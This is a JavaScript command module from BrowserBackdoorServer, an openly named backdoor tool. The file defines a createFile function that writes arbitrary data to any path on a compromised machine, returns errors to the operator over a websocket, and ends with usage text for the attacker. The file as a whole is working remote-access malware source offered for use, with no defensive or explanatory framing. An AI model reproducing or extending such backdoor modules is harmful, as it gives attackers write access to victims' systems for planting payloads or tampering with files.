// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Creates a file
 * Parameters: fullPath, Data in file
 * Returns: undefined, error
 * Author: IMcPwn
 */

fs = require('fs');

createFile = function (fullPath, data) {
    fs.writeFile(fullPath, data, function(err) {
        if (err) ws.send(err);
    }); 
}

return "\nUsage: createFile(fullPath, data)\n- fullPath is the properly escaped full path of the file.\n- data is the text to write to the file.";
